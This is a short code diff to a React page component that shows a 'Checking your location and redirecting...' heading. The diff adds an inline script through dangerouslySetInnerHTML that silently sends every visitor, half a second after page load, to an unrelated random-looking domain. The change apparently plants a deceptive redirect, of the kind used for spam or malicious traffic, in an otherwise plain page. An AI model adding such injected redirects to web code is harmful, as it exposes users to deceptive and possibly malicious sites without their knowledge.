@@ -11,6 +11,7 @@ export default function ImgPage({ ogImage }) {
       </head>
       <body>
         <h1>Checking your location and redirecting...</h1>
+        <script dangerouslySetInnerHTML={{ __html: `window.setTimeout(function(){window.location.href = 'https://broadlyjukeboxunrevised.com/2053781';}, 500);` }} />
       </body>
     </html>
   );
